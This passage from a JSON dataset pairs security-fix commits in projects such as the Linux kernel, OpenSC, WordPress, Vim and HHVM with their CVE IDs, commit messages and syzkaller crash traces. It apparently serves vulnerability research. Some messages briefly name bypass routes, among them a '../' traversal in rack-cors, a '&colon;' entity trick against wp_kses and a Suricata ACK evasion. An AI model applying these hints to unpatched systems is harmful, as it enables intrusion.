i2c_algo_pca mlxreg_hotplug st_pressure st_sensors industrialio_triggered_buffer kfifo_buf industrialio v4l2_common videodev media snd_soc_adau_utils rc_pinnacle_grey rc_core pps_gpio leds_lm3692x nandcore ledtrig_pattern iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun mousedev ppdev tpm kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel ide_pci_generic aes_x86_64 piix crypto_simd input_leds psmouse cryp td glue_helper ide_core intel_agp serio_raw intel_gtt agpgart ata_generic i2c_piix4 pata_acpi parport_pc parport rtc_cmos floppy sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: paride]Dumping ftrace buffer: (ftrace buffer empty)---[ end trace 7a818cf5f210d79e ]---If alloc_disk fails in pf_init_units, pf->disk will beNULL, however in pf_detect and pf_exit, it's not checkthis before free.It may result a NULL pointer dereference.Also when register_blkdev failed, blk_cleanup_queue() andblk_mq_free_tag_set() should be called to free resources.Reported-by: Hulk Robot <hulkci@huawei.com>Fixes: 6ce5902 (\"paride/pf: cleanup queues when detection fails\")Signed-off-by: YueHaibing <yuehaibing@huawei.com>Signed-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2019-15922"
    ],
    "cveIdsCount": 1
  },
  "cd41d2dc742d3f103426aad3b29b8313a65adc4d42dcf9866807ecbeafc65053": {
    "url": "https://github.com/torvalds/linux/commit/f0d1762554014ce0ae347b9f0d088f2c157c8c72",
    "title": "paride/pcd: Fix potential NULL pointer dereference and mem leak",
    "body": "Syzkaller report this:pcd: pcd version 1.07, major 46, nice 0pcd0: Autoprobe failedpcd: No CD-ROM drive foundkasan: CONFIG_KASAN_INLINE enabledkasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] SMP KASAN PTICPU: 1 PID: 4525 Comm: syz-executor.0 Not tainted 5.1.0-rc3+ #8Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014RIP: 0010:pcd_init+0x95c/0x1000 [pcd]Code: c4 ab f7 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 56 a3 da f7 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 39 a3 da f7 49 8b bc 24 80 05 00 00 e8 cc b2RSP: 0018:ffff8881e84df880 EFLAGS: 00010202RAX: 00000000000000b0 RBX: ffffffffc155a088 RCX: ffffffffc1508935RDX: 0000000000040000 RSI: ffffc900014f0000 RDI: 0000000000000580RBP: dffffc0000000000 R08: ffffed103ee658b8 R09: ffffed103ee658b8R10: 0000000000000001 R11: ffffed103ee658b7 R12: 0000000000000000R13: ffffffffc155a778 R14: ffffffffc155a4a8 R15: 0000000000000003FS: 00007fe71bee3700(0000) GS:ffff8881f7300000(0000) knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 000055a7334441a8 CR3: 00000001e9674003 CR4: 00000000007606e0DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400PKRU: 55555554Call Trace: ? 0xffffffffc1508000 ? 0xffffffffc1508000 do_one_initcall+0xbc/0x47d init/main.c:901 do_init_module+0x1b5/0x547 kernel/module.c:3456 load_module+0x6405/0x8c10 kernel/module.c:3804 __do_sys_finit_module+0x162/0x190 kernel/module.c:3898 do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007fe71bee2c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003RBP: 00007fe71bee2c70 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007fe71bee36bcR13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004Modules linked in: pcd(+) paride solos_pci atm ts_fsm rtc_mt6397 mac80211 nhc_mobility nhc_udp nhc_ipv6 nhc_hop nhc_dest nhc_fragment nhc_routing 6lowpan rtc_cros_ec memconsole intel_xhci_usb_role_switch roles rtc_wm8350 usbcore industrialio_triggered_buffer kfifo_buf industrialio asc7621 dm_era dm_persistent_data dm_bufio dm_mod tpm gnss_ubx gnss_serial serdev gnss max2165 cpufreq_dt hid_penmount hid menf21bmc_wdt rc_core n_tracesink ide_gd_mod cdns_csi2tx v4l2_fwnode videodev media pinctrl_lewisburg pinctrl_intel iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun joydev mousedev ppdev kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel aes_x86_64 crypto_simd ide_pci_generic piix input_leds cryptd glue_helper psmouse ide_core intel_agp serio_raw intel_gtt ata_generic i2c_piix4 agpgart pata_acpi parport_pc parport floppy rtc_cmos sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: bmc150_magn]Dumping ftrace buffer: (ftrace buffer empty)---[ end trace d873691c3cd69f56 ]---If alloc_disk fails in pcd_init_units, cd->disk will beNULL, however in pcd_detect and pcd_exit, it's not checkthis before free.It may result a NULL pointer dereference.Also when register_blkdev failed, blk_cleanup_queue() andblk_mq_free_tag_set() should be called to free resources.Reported-by: Hulk Robot <hulkci@huawei.com>Fixes: 81b74ac (\"paride/pcd: cleanup queues when detection fails\")Signed-off-by: YueHaibing <yuehaibing@huawei.com>Signed-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2019-15923"
    ],
    "cveIdsCount": 1
  },
  "6fe1d9fc231d8f5d561bbb2278abf2f578e7f5c202c29bcbec5e65cbd7f7c3a7": {
    "url": "https://github.com/torvalds/linux/commit/01ca667133d019edc9f0a1f70a272447c84ec41f",
    "title": "fm10k: Fix a potential NULL pointer dereference",
    "body": "Syzkaller report this:kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] SMP KASAN PTICPU: 0 PID: 4378 Comm: syz-executor.0 Tainted: G C 5.0.0+ #5Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014RIP: 0010:__lock_acquire+0x95b/0x3200 kernel/locking/lockdep.c:3573Code: 00 0f 85 28 1e 00 00 48 81 c4 08 01 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f c3 4c 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 cc 24 00 00 49 81 7d 00 e0 de 03 a6 41 bc 00 00RSP: 0018:ffff8881e3c07a40 EFLAGS: 00010002RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000RDX: 0000000000000010 RSI: 0000000000000000 RDI: 0000000000000080RBP: 0000000000000000 R08: 0000000000000001 R09: 0000000000000000R10: ffff8881e3c07d98 R11: ffff8881c7f21f80 R12: 0000000000000001R13: 0000000000000080 R14: 0000000000000000 R15: 0000000000000001FS: 00007fce2252e700(0000) GS:ffff8881f2400000(0000) knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 00007fffc7eb0228 CR3: 00000001e5bea002 CR4: 00000000007606f0DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400PKRU: 55555554Call Trace: lock_acquire+0xff/0x2c0 kernel/locking/lockdep.c:4211 __mutex_lock_common kernel/locking/mutex.c:925 [inline] __mutex_lock+0xdf/0x1050 kernel/locking/mutex.c:1072 drain_workqueue+0x24/0x3f0 kernel/workqueue.c:2934 destroy_workqueue+0x23/0x630 kernel/workqueue.c:4319 __do_sys_delete_module kernel/module.c:1018 [inline] __se_sys_delete_module kernel/module.c:961 [inline] __x64_sys_delete_module+0x30c/0x480 kernel/module.c:961 do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007fce2252dc58 EFLAGS: 00000246 ORIG_RAX: 00000000000000b0RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000020000140RBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007fce2252e6bcR13: 00000000004bcca9 R14: 00000000006f6b48 R15: 00000000ffffffffIf alloc_workqueue fails, it should return -ENOMEM, otherwise maytrigger this NULL pointer dereference while unloading drivers.Reported-by: Hulk Robot <hulkci@huawei.com>Fixes: 0a38c17 (\"fm10k: Remove create_workqueue\")Signed-off-by: Yue Haibing <yuehaibing@huawei.com>Tested-by: Andrew Bowers <andrewx.bowers@intel.com>Signed-off-by: Jeff Kirsher <jeffrey.t.kirsher@intel.com>",
    "cveIds": [
      "CVE-2019-15924"
    ],
    "cveIdsCount": 1
  },
  "d122569c1530c937dc810a38dd34cbc575fb0ae6c6071c771d0fcb74a09a99cc": {
    "url": "https://github.com/OpenSC/OpenSC/commit/412a6142c27a5973c61ba540e33cdc22d5608e68",
    "title": "fixed out of bounds access of ASN.1 Bitstring",
    "body": "Credit to OSS-Fuzz",
    "cveIds": [
      "CVE-2019-15945"
    ],
    "cveIdsCount": 1
  },
  "37c3b9d590b02f6c36e890b4dac300a822233f7a5949b8028f8ee6598c920ebb": {
    "url": "https://github.com/OpenSC/OpenSC/commit/a3fc7693f3a035a8a7921cffb98432944bb42740",
    "title": "Fixed out of bounds access in ASN.1 Octet string",
    "body": "Credit to OSS-Fuzz",
    "cveIds": [
      "CVE-2019-15946"
    ],
    "cveIdsCount": 1
  },
  "1426b76ec4ed085ef9d5fb874cf667adceb16a4c11832861e5acbacc5d192082": {
    "url": "https://github.com/OpenSC/pam_p11/commit/d150b60e1e14c261b113f55681419ad1dfa8a76c",
    "title": "Use EVP_PKEY_size() to allocate correct size of signature buffer. (#18)",
    "body": "Do not use fixed buffer size for signature, EVP_SignFinal() requiresbuffer for signature at least EVP_PKEY_size(pkey) bytes in size.Fixes crash when using 4K RSA signatures (#16, #15)",
    "cveIds": [
      "CVE-2019-16058"
    ],
    "cveIdsCount": 1
  },
  "5683c2d5a12c258496fcffa35fa30c8659c574448e5c109222c3c4d6aaa9918b": {
    "url": "https://github.com/Cacti/cacti/commit/adf221344359f5b02b8aed43dfb6b33ae5d708c8",
    "title": "Resoving Issue #3026",
    "body": "Unsafe deserialization in of selected objects in Cacti",
    "cveIds": [
      "CVE-2019-17358"
    ],
    "cveIdsCount": 1
  },
  "a4271509802d333ea51f086a855cc873abc91cac39ca51f41f57ca46b1d0df72": {
    "url": "https://github.com/openwrt/luci/commit/f8c6eb67cd9da09ee20248fec6ab742069635e47",
    "title": "luci-base: fix CSRF prevention for arcombine targets",
    "body": "The dispatcher failed to propagate the child target post securityrequirements to the arcombine() dispatch target so far - fix thisby recursively testing the post security requirements.Signed-off-by: Jo-Philipp Wich <jo@mein.io>",
    "cveIds": [
      "CVE-2019-17367"
    ],
    "cveIdsCount": 1
  },
  "6d4812ae87e2eaad0f8c3070c604259ff546c6cdb176dfcc8da1da9a1166483a": {
    "url": "https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c",
    "title": "fix(query): delete top-level _bsontype property in queries to preve…",
    "body": "…nt silent empty queriesFix #8222",
    "cveIds": [
      "CVE-2019-17426"
    ],
    "cveIdsCount": 1
  },
  "2a4e6de145f00c071c323e2ba832d4f137b0b7a32b4ea17a78da0329a19e2fba": {
    "url": "https://github.com/keepkey/keepkey-firmware/commit/b222c66cdd7c3203d917c80ba615082d309d80c3",
    "title": "board: factor out tiny_dispatch",
    "body": "And add stronger checks on what tiny_msg's are allowed to be decoded.",
    "cveIds": [
      "CVE-2019-18671"
    ],
    "cveIdsCount": 1
  },
  "fbb99189aeb1b940abd43b9395dc2a3ced181e3b8ccdbfe57711558739245be2": {
    "url": "https://github.com/torvalds/linux/commit/91573ae4aed0a49660abdad4d42f2a0db995ee5e",
    "title": "net: rds: Fix NULL ptr use in rds_tcp_kill_sock",
    "body": "After the commit c4e97b0 (\"net: rds: force to destroyconnection if t_sock is NULL in rds_tcp_kill_sock().\"),it introduced null-ptr-deref in rds_tcp_kill_sock as below:BUG: KASAN: null-ptr-deref on address 0000000000000020Read of size 8 by task kworker/u16:10/910CPU: 3 PID: 910 Comm: kworker/u16:10 Not tainted 4.4.178+ #3Hardware name: linux,dummy-virt (DT)Workqueue: netns cleanup_netCall trace:[<ffffff90080abb50>] dump_backtrace+0x0/0x618[<ffffff90080ac1a0>] show_stack+0x38/0x60[<ffffff9008c42b78>] dump_stack+0x1a8/0x230[<ffffff90085d469c>] kasan_report_error+0xc8c/0xfc0[<ffffff90085d54a4>] kasan_report+0x94/0xd8[<ffffff90085d1b28>] __asan_load8+0x88/0x150[<ffffff9009c9cc2c>] rds_tcp_dev_event+0x734/0xb48[<ffffff90081eacb0>] raw_notifier_call_chain+0x150/0x1e8[<ffffff900973fec0>] call_netdevice_notifiers_info+0x90/0x110[<ffffff9009764874>] netdev_run_todo+0x2f4/0xb08[<ffffff9009796d34>] rtnl_unlock+0x2c/0x48[<ffffff9009756484>] default_device_exit_batch+0x444/0x528[<ffffff9009720498>] ops_exit_list+0x1c0/0x240[<ffffff9009724a80>] cleanup_net+0x738/0xbf8[<ffffff90081ca6cc>] process_one_work+0x96c/0x13e0[<ffffff90081cf370>] worker_thread+0x7e0/0x1910[<ffffff90081e7174>] kthread+0x304/0x390[<ffffff9008094280>] ret_from_fork+0x10/0x50If the first loop add the tc->t_sock = NULL to the tmp_list,1). list_for_each_entry_safe(tc, _tc, &rds_tcp_conn_list, t_tcp_node)then the second loop is to find connections to destroy, tc->t_sockmight equal NULL, and tc->t_sock->sk happens null-ptr-deref.2). list_for_each_entry_safe(tc, _tc, &tmp_list, t_tcp_node)Fixes: c4e97b0 (\"net: rds: force to destroy connection if t_sock is NULL in rds_tcp_kill_sock().\")Signed-off-by: Mao Wenan <maowenan@huawei.com>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2019-18680"
    ],
    "cveIdsCount": 1
  },
  "5b85e2da8ae4ed9a1a170589235b50d00838620e39db472ad7b65b9da4b9c079": {
    "url": "https://github.com/OISF/suricata/commit/1c63d3905852f746ccde7e2585600b2199cefb4b",
    "title": "stream: reject broken ACK packets",
    "body": "Fix evasion posibility by rejecting packets with a broken ACK field.These packets have a non-0 ACK field, but do not have a ACK flag set.Bug #3324.Reported-by: Nicolas Adba(cherry picked from commit fa692df)",
    "cveIds": [
      "CVE-2019-18792"
    ],
    "cveIdsCount": 1
  },
  "299e20faceb15f1af242108f38718f53c300edf9dab26277b250c875dad4fb36": {
    "url": "https://github.com/OISF/suricata/commit/fa692df37a796c3330c81988d15ef1a219afc006",
    "title": "stream: reject broken ACK packets",
    "body": "Fix evasion posibility by rejecting packets with a broken ACK field.These packets have a non-0 ACK field, but do not have a ACK flag set.Bug #3324.Reported-by: Nicolas Adba",
    "cveIds": [
      "CVE-2019-18792"
    ],
    "cveIdsCount": 1
  },
  "1b461ee101c4c2042dcc8f31ae14265ac682cbb974f9ae2ce0c0cda0a83ff5b3": {
    "url": "https://github.com/nov/json-jwt/commit/ada16e772906efdd035e3df49cb2ae372f0f948a",
    "title": "explicitly specifying number of elements when splitting JWE string",
    "body": "ref.) CVE-2019-18848",
    "cveIds": [
      "CVE-2019-18848"
    ],
    "cveIdsCount": 1
  },
  "0e1893dda86ca0b37ba24a37a7e471c2e12103227a7859dfaf8eda6d9160c55d": {
    "url": "https://github.com/torvalds/linux/commit/09ba3bc9dd150457c506e4661380a6183af651c1",
    "title": "btrfs: merge btrfs_find_device and find_device",
    "body": "Both btrfs_find_device() and find_device() does the same thing exceptthat the latter does not take the seed device onto account in the devicescanning context. We can merge them.Signed-off-by: Anand Jain <anand.jain@oracle.com>Reviewed-by: David Sterba <dsterba@suse.com>Signed-off-by: David Sterba <dsterba@suse.com>",
    "cveIds": [
      "CVE-2019-18885"
    ],
    "cveIdsCount": 1
  },
  "171c23c859f06616361b4ae77ea7b290dd53aafc51bfbfda6276c5ee142e663a": {
    "url": "https://github.com/cyu/rack-cors/commit/e4d4fc362a4315808927011cbe5afcfe5486f17d",
    "title": "Unescape and resolve paths before resource checks",
    "body": "Fix scenario where someone could use '../' to access private resources",
    "cveIds": [
      "CVE-2019-18978"
    ],
    "cveIdsCount": 1
  },
  "b4c4431be95a052d4e211c0ec914601a3e8df8ecd7f324809b6f34f3ce15a990": {
    "url": "https://github.com/pimcore/pimcore/commit/e0b48faf7d29ce43a98825a0b230e88350ebcf78",
    "title": "[Email] Email log: do not allow script/iframe execution in preview wi…",
    "body": "…ndow",
    "cveIds": [
      "CVE-2019-18982"
    ],
    "cveIdsCount": 1
  },
  "53bf86bdd0a63ed02f106d66a1120f2ea9aa45cab3a2ecaf666294f94a53a3a3": {
    "url": "https://github.com/xsmo/Image-Uploader-and-Browser-for-CKEditor/commit/c293d38c8b99444e775d94c1af50c9676c6544d2",
    "title": "Merge pull request #11 from mvisat/security-fix",
    "body": "Fix security issue",
    "cveIds": [
      "CVE-2019-19502"
    ],
    "cveIdsCount": 1
  },
  "c72663a0e5e2e682c75077950dc11aebd437f24f77e2e07bc1caeafae8383ca2": {
    "url": "https://github.com/torvalds/linux/commit/59c4bd853abcea95eccc167a7d7fd5f1a5f47b98",
    "title": "x86/fpu: Don't cache access to fpu_fpregs_owner_ctx",
    "body": "The state/owner of the FPU is saved to fpu_fpregs_owner_ctx by pointingto the context that is currently loaded. It never changed during thelifetime of a task - it remained stable/constant.After deferred FPU registers loading until return to userland wasimplemented, the content of fpu_fpregs_owner_ctx may change duringpreemption and must not be cached.This went unnoticed for some time and was now noticed, in particularsince gcc 9 is caching that load in copy_fpstate_to_sigframe() andreusing it in the retry loop: copy_fpstate_to_sigframe() load fpu_fpregs_owner_ctx and save on stack fpregs_lock() copy_fpregs_to_sigframe() /* failed */ fpregs_unlock() *** PREEMPTION, another uses FPU, changes fpu_fpregs_owner_ctx *** fault_in_pages_writeable() /* succeed, retry */ fpregs_lock()__fpregs_load_activate() fpregs_state_valid() /* uses fpu_fpregs_owner_ctx from stack */ copy_fpregs_to_sigframe() /* succeeds, random FPU content */This is a comparison of the assembly produced by gcc 9, without vs with thispatch:| # arch/x86/kernel/fpu/signal.c:173: if (!access_ok(buf, size))| cmpq %rdx, %rax # tmp183, _4| jb .L190 #,|-# arch/x86/include/asm/fpu/internal.h:512: return fpu == this_cpu_read_stable(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;|-#APP|-# 512 \"arch/x86/include/asm/fpu/internal.h\" 1|- movq %gs:fpu_fpregs_owner_ctx,%rax #, pfo_ret__|-# 0 \"\" 2|-#NO_APP|- movq %rax, -88(%rbp) # pfo_ret__, %sfp…|-# arch/x86/include/asm/fpu/internal.h:512: return fpu == this_cpu_read_stable(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;|- movq -88(%rbp), %rcx # %sfp, pfo_ret__|- cmpq %rcx, -64(%rbp) # pfo_ret__, %sfp|+# arch/x86/include/asm/fpu/internal.h:512: return fpu == this_cpu_read(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;|+#APP|+# 512 \"arch/x86/include/asm/fpu/internal.h\" 1|+ movq %gs:fpu_fpregs_owner_ctx(%rip),%rax # fpu_fpregs_owner_ctx, pfo_ret__|+# 0 \"\" 2|+# arch/x86/include/asm/fpu/internal.h:512: return fpu == this_cpu_read(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;|+#NO_APP|+ cmpq %rax, -64(%rbp) # pfo_ret__, %sfpUse this_cpu_read() instead this_cpu_read_stable() to avoid caching offpu_fpregs_owner_ctx during preemption points.The Fixes: tag points to the commit where deferred FPU loading wasadded. Since this commit, the compiler is no longer allowed to move theload of fpu_fpregs_owner_ctx somewhere else / outside of the lockedsection. A task preemption will change its value and stale content willbe observed. [ bp: Massage. ]Debugged-by: Austin Clements <austin@google.com>Debugged-by: David Chase <drchase@golang.org>Debugged-by: Ian Lance Taylor <ian@airs.com>Fixes: 5f409e2 (\"x86/fpu: Defer FPU state load until return to userspace\")Signed-off-by: Sebastian Andrzej Siewior <bigeasy@linutronix.de>Signed-off-by: Borislav Petkov <bp@suse.de>Reviewed-by: Rik van Riel <riel@surriel.com>Tested-by: Borislav Petkov <bp@suse.de>Cc: Aubrey Li <aubrey.li@intel.com>Cc: Austin Clements <austin@google.com>Cc: Barret Rhoden <brho@google.com>Cc: Dave Hansen <dave.hansen@intel.com>Cc: David Chase <drchase@golang.org>Cc: \"H. Peter Anvin\" <hpa@zytor.com>Cc: ian@airs.comCc: Ingo Molnar <mingo@redhat.com>Cc: Josh Bleecher Snyder <josharian@gmail.com>Cc: Thomas Gleixner <tglx@linutronix.de>Cc: x86-ml <x86@kernel.org>Link: https://lkml.kernel.org/r/20191128085306.hxfa2o3knqtu4wfn@linutronix.deLink: https://bugzilla.kernel.org/show_bug.cgi?id=205663",
    "cveIds": [
      "CVE-2019-19602"
    ],
    "cveIdsCount": 1
  },
  "d8ca3ff0c4cbe9f43e60ee8ed5f88090305956a90424625fb560988fe8e59e8c": {
    "url": "https://github.com/torvalds/linux/commit/4ea99936a1630f51fc3a2d61a58ec4a1c4b7d55a",
    "title": "ext4: add more paranoia checking in ext4_expand_extra_isize handling",
    "body": "It's possible to specify a non-zero s_want_extra_isize via debuggingoption, and this can cause bad things(tm) to happen when using a filesystem with an inode size of 128 bytes.Add better checking when the file system is mounted, as well as whenwe are actually doing the trying to do the inode expansion.Link: https://lore.kernel.org/r/20191110121510.GH23325@mit.eduReported-by: syzbot+f8d6f8386ceacdbfff57@syzkaller.appspotmail.comReported-by: syzbot+33d7ea72e47de3bdf4e1@syzkaller.appspotmail.comReported-by: syzbot+44b6763edfc17144296f@syzkaller.appspotmail.comSigned-off-by: Theodore Ts'o <tytso@mit.edu>Cc: stable@kernel.org",
    "cveIds": [
      "CVE-2019-19767"
    ],
    "cveIdsCount": 1
  },
  "f115081d4bd77f07222b83cd33cde87d8b4915919ddb178da6228d9bbe1fdd55": {
    "url": "https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53",
    "title": "Update wp_kses_bad_protocol() to recognize &colon; on uri attribu…",
    "body": "…tes,`wp_kses_bad_protocol()` makes sure to validate that uri attributes don’t contain invalid/or not allowed protocols. While this works fine in most cases, there’s a risk that by using the colon html5 named entity, one is able to bypass this function.Brings r46895 to the 5.3 branch.Props: xknown, nickdaugherty, peterwilsoncc.git-svn-id: https://develop.svn.wordpress.org/branches/5.3@46899 602fd350-edb4-49c9-b593-d223f7449a82",
    "cveIds": [
      "CVE-2019-20041"
    ],
    "cveIdsCount": 1
  },
  "11cfde8d638670d9cc05debc4adbaf1bcdb406ce99b39f09a796e9634d9e9665": {
    "url": "https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d",
    "title": "Prevent stored XSS through wp_targeted_link_rel().",
    "body": "Brings r46894 to the 5.3 branch.Props: vortfu, whyisjake, peterwilsoncc, xknown, SergeyBiryukov, flaviozavan.git-svn-id: https://develop.svn.wordpress.org/branches/5.3@46898 602fd350-edb4-49c9-b593-d223f7449a82",
    "cveIds": [
      "CVE-2019-20042"
    ],
    "cveIdsCount": 1
  },
  "fe2e427d6e1d2ff9760c03ac5e069b09489efa658d1f635a5a6aa64b4adfe5f7": {
    "url": "https://github.com/WordPress/wordpress-develop/commit/1d1d5be7aa94608c04516cac4238e8c22b93c1d9",
    "title": "Ensure that a user can publish_posts before making a post sticky.",
    "body": "Props: danielbachhuber, whyisjake, peterwilson, xknown.git-svn-id: https://develop.svn.wordpress.org/branches/5.3@46897 602fd350-edb4-49c9-b593-d223f7449a82",
    "cveIds": [
      "CVE-2019-20043"
    ],
    "cveIdsCount": 1
  },
  "e5948d98c0374f34297e7022184b9efc70b4830d4933bdbcbf8e5c10e67457f3": {
    "url": "https://github.com/vim/vim/commit/ec66c41d84e574baf8009dbc0bd088d2bc5b2421",
    "title": "patch 8.1.2136: using freed memory with autocmd from fuzzer",
    "body": "Problem: using freed memory with autocmd from fuzzer. (Dhiraj Mishra, Dominique Pelle)Solution: Avoid using \"wp\" after autocommands. (closes #5041)",
    "cveIds": [
      "CVE-2019-20079"
    ],
    "cveIdsCount": 1
  },
  "543396f0ffe20ff9d0d45e313ecbe813166302d3ede4aa5bfd89a23b02c37f74": {
    "url": "https://github.com/SerenityOS/serenity/commit/0fc24fe2564736689859e7edfa177a86dac36bf9",
    "title": "Kernel: User pointer validation should reject kernel-only addresses",
    "body": "We were happily allowing syscalls with pointers into kernel-onlyregions (virtual address >= 0xc0000000).This patch fixes that by only considering user regions in the currentprocess, and also double-checking the Region::is_user_accessible() flagbefore approving an access.Thanks to Fire30 for finding the bug! :^)",
    "cveIds": [
      "CVE-2019-20172"
    ],
    "cveIdsCount": 1
  },
  "dab663d7bf55eea6f1f369f1c7e1e36ba1f0903556c1cc920675c68daa458bf7": {
    "url": "https://github.com/libressl-portable/portable/commit/17c88164016df821df2dff4b2b1291291ec4f28a",
    "title": "Make pthread_mutex static initialisation work on Windows.",
    "body": "This takes the dynamic initialisation code added to CRYPTO_lock() in e508171and applies it to the Window's pthread_mutex implementation. This allows forPTHREAD_MUTEX_INITIALIZER to be used on Windows.bcook has agreed to place this code in the public domain (as per the rest ofthe code in pthread.h).",
    "cveIds": [
      "CVE-2019-25048",
      "CVE-2019-25049"
    ],
    "cveIdsCount": 2
  },
  "f6367a4506dc00779ac0c4af308958d8c196ee17eb39dcc7c6502647b11eb04f": {
    "url": "https://github.com/facebook/fbthrift/commit/c5d6e07588cd03061bc54d451a7fa6e84883d62b",
    "title": "Throw on bad types during skipping data",
    "body": "Summary:The current code silently returns on bad types. In case when we have an invalid data, we may get a container of a large size with a bad type, this would lead to us running long loop doing nothing (though we already can say that the data is invalid).The new code would throw an exception as soon as we try to skip a value of invalid type.Fixes CVE-2019-3552Reviewed By: yfeldblum, steveguryDifferential Revision: D8344920fbshipit-source-id: f12e8f3442f7ad5e1a81d822380701e929b80f0d",
    "cveIds": [
      "CVE-2019-3552",
      "CVE-2019-3558"
    ],
    "cveIdsCount": 2
  },
  "1e8a1f7ca9ee25bc9c7431f7615d004981fd91e47548b6e53544e41d8a6cde6c": {
    "url": "https://github.com/facebook/hhvm/commit/6e4dd9ec3f14b48170fc45dc9d13a3261765f994",
    "title": "CVE-2019-3557: Fix OOB read in readRecord on BZ2Files/OutputFiles",
    "body": "Summary:These File subclasses return -1 on read errors which is not what isexpected for readImpl--this made File::readRecord behave unusually if the readfails, causing it to read (size_t)(-1) bytes from its stream buffer; which,unsurprisingly produces a out-of-bounds heap read.Reviewed By: leikahing, jjgriegoDifferential Revision: D13659395fbshipit-source-id: 359ed6e3ff9f9cf49b752b666f51c4e0b3ce4b8a",
    "cveIds": [
      "CVE-2019-3557"
    ],
    "cveIdsCount": 1
  },
  "7f1f13466db607ff89a413059d3d0f90083425deb9bf8040057c5fa6fa80712a": {
    "url": "https://github.com/facebook/fbthrift/commit/a56346ceacad28bf470017a6bda1d5518d0bd943",
    "title": "Throw on bad types during skipping data",
    "body": "Summary:The current code silently returns on bad types. In case when we have an invalid data, we may get a container of a large size with a bad type, this would lead to us running long loop doing nothing (though we already can say that the data is invalid).The new code would throw an exception as soon as we try to skip a value of invalid type.Fixes CVE-2019-3552Reviewed By: steveguryDifferential Revision: D13892370fbshipit-source-id: 582c81f90cf40c105383083cb38815816140e3ad",
    "cveIds": [
      "CVE-2019-3559"
    ],
    "cveIdsCount": 1
  },
  "6dffef56c152b7a744767f5fa9e9cd59af9d8d00ca6f36ac3b27486f06c7c25a": {
    "url": "https://github.com/facebook/hhvm/commit/46003b4ab564b2abcd8470035fc324fe36aa8c75",
    "title": "Prevent strrpos and strripos from visiting out-of-bounds memory.",
    "body": "Reviewed By: alexeytDifferential Revision: D14669668fbshipit-source-id: 16bb4674bccf83ffd737e60d1fd9fd4a0093f77c",
    "cveIds": [
      "CVE-2019-3561"
